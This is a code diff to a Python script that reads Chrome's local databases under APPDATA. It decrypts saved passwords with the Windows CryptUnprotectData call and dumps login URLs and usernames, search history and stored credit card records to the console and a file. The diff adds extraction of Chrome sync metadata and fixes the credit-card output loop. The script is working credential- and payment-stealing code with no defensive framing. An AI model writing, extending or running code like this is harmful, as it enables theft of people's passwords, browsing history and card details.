@@ -11,9 +11,11 @@ password_field = "   Password: "
 conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
 conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
 conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
+conn5 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Sync Data\SyncData.sqlite3")
 cursor3 = conn3.cursor()
 cursor1 = conn1.cursor()
 cursor = conn.cursor()
+cursor5 = conn5.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 for result in cursor.fetchall():
 	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
@@ -30,7 +32,7 @@ print('---------------------------------------------')
 print("Google Keyword Searches:")
 result = cursor3.fetchall() 
 for r in result:
-        print (r)
+        print(r)
         f.write(str(r))
 
 cursor1.execute("SELECT * FROM credit_cards")
@@ -38,7 +40,16 @@ print('---------------------------------------------')
 print("Credit Card Data:")
 result = cursor1.fetchall() 
 for r in result:
-    f.write(str(result))
-    f.close()
+        print(r)
+        f.write(str(r))
+cursor5.execute("SELECT non_unique_name FROM metas") 
+result = cursor5.fetchall()
+for r in result:
+	print(r)
+	f.write(str(r))
+        
 
+
+        
+        
 
